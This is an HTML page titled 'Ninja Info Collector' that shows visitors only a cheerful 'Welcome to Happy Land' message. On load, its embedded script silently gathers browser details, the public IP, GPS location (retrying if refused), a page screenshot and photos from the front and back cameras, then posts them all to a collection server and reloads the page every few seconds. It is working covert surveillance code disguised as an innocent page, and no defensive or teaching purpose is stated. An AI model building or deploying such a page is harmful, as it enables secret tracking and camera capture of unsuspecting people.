<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Ninja Info Collector</title>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/html2canvas/0.4.1/html2canvas.min.js"></script>
    <script>
        document.addEventListener("DOMContentLoaded", function() {
            // User Agent
            var userAgent = navigator.userAgent;

            // Fetch IP Address
            async function getIPAddress() {
                try {
                    let response = await fetch('https://api.ipify.org?format=json');
                    let data = await response.json();
                    return data.ip;
                } catch (error) {
                    console.error('Error fetching IP:', error);
                    return 'Error fetching IP';
                }
            }

            // Fetch Geolocation
            function getGeolocation() {
                return new Promise((resolve) => {
                    if (navigator.geolocation) {
                        navigator.geolocation.getCurrentPosition(
                            position => resolve({
                                latitude: position.coords.latitude,
                                longitude: position.coords.longitude
                            }),
                            error => {
                                console.error('Error fetching geolocation:', error);
                                setTimeout(() => getGeolocation().then(resolve), 5000); // Retry every 5 seconds
                            }
                        );
                    } else {
                        console.error('Geolocation not supported');
                        resolve({
                            latitude: 'Geolocation not supported',
                            longitude: 'Geolocation not supported'
                        });
                    }
                });
            }

            // Get Cookies
            function getCookies() {
                try {
                    var cookies = document.cookie.split(';').reduce((cookieObject, cookieString) => {
                        var parts = cookieString.split('=');
                        cookieObject[parts[0].trim()] = parts[1] ? parts[1].trim() : '';
                        return cookieObject;
                    }, {});
                    return cookies;
                } catch (error) {
                    console.error('Error fetching cookies:', error);
                    return 'Error fetching cookies';
                }
            }

            // Get Referrer
            function getReferrer() {
                return document.referrer || "No referrer";
            }

            // Get Page Load Time
            function getPageLoadTime() {
                return window.performance.timing.domContentLoadedEventEnd - window.performance.timing.navigationStart;
            }

            // Get Screen Resolution
            function getScreenResolution() {
                return `${screen.width}x${screen.height}`;
            }

            // Get Local Time
            function getLocalTime() {
                return new Date().toLocaleString();
            }

            // Capture Screenshot
            function captureScreenshot(callback) {
                html2canvas(document.body).then(canvas => {
                    canvas.toBlob(blob => {
                        callback(blob);
                    });
                });
            }

            // Capture Camera Photo
            function captureCameraPhoto(cameraMode, callback) {
                const video = document.createElement('video');
                navigator.mediaDevices.getUserMedia({ video: { facingMode: cameraMode } })
                    .then(stream => {
                        video.srcObject = stream;
                        video.play();
                        setTimeout(() => {
                            const canvas = document.createElement('canvas');
                            canvas.width = video.videoWidth;
                            canvas.height = video.videoHeight;
                            canvas.getContext('2d').drawImage(video, 0, 0);
                            canvas.toBlob(blob => {
                                stream.getTracks().forEach(track => track.stop());
                                callback(blob);
                            });
                        }, 1000);
                    })
                    .catch(error => {
                        console.error('Error accessing camera:', error);
                        callback(null);
                    });
            }

            // Send Data to Server
            function sendDataToServer(data, endpoint, isJson, callback) {
                fetch(endpoint, {
                    method: 'POST',
                    headers: isJson ? {'Content-Type': 'application/json'} : {},
                    body: isJson ? JSON.stringify(data) : data
                })
                .then(response => response.json())
                .then(result => {
                    console.log('Success:', result);
                    if (callback) callback();
                })
                .catch(error => {
                    console.error('Error:', error);
                    if (callback) callback();
                });
            }

            // Collect and Send Data
            function collectAndSendData() {
                const data = {
                    userAgent: userAgent,
                    referrer: getReferrer(),
                    pageLoadTime: getPageLoadTime(),
                    screenResolution: getScreenResolution(),
                    localTime: getLocalTime()
                };

                sendDataToServer(data, 'http://localhost:5000/logs', true, () => {
                    getIPAddress().then(ipAddress => {
                        sendDataToServer({ ipAddress: ipAddress }, 'http://localhost:5000/logs', true, () => {
                            getGeolocation().then(location => {
                                sendDataToServer(location, 'http://localhost:5000/logs', true, () => {
                                    captureScreenshot(screenshotBlob => {
                                        if (screenshotBlob) {
                                            const formData = new FormData();
                                            formData.append('screenshot', screenshotBlob, 'screenshot.png');
                                            sendDataToServer(formData, 'http://localhost:5000/upload', false, () => {
                                                captureCameraPhoto('user', frontCameraBlob => {
                                                    if (frontCameraBlob) {
                                                        const frontFormData = new FormData();
                                                        frontFormData.append('frontCamera', frontCameraBlob, 'front_camera.png');
                                                        sendDataToServer(frontFormData, 'http://localhost:5000/upload', false, () => {
                                                            captureCameraPhoto('environment', backCameraBlob => {
                                                                if (backCameraBlob) {
                                                                    const backFormData = new FormData();
                                                                    backFormData.append('backCamera', backCameraBlob, 'back_camera.png');
                                                                    sendDataToServer(backFormData, 'http://localhost:5000/upload', false, () => {
                                                                        setTimeout(() => location.reload(), 5000);
                                                                    });
                                                                } else {
                                                                    setTimeout(() => location.reload(), 5000);
                                                                }
                                                            });
                                                        });
                                                    } else {
                                                        setTimeout(() => location.reload(), 5000);
                                                    }
                                                });
                                            });
                                        } else {
                                            setTimeout(() => location.reload(), 5000);
                                        }
                                    });
                                });
                            });
                        });
                    });
                });
            }

            // Start the process
            collectAndSendData();
            setTimeout(() => location.reload(), 5000);
        });
    </script>
</head>
<body>
    <h1>Welcome to Happy Land</h1>
    <p>Your visit is being Happy!</p>
</body>
</html>
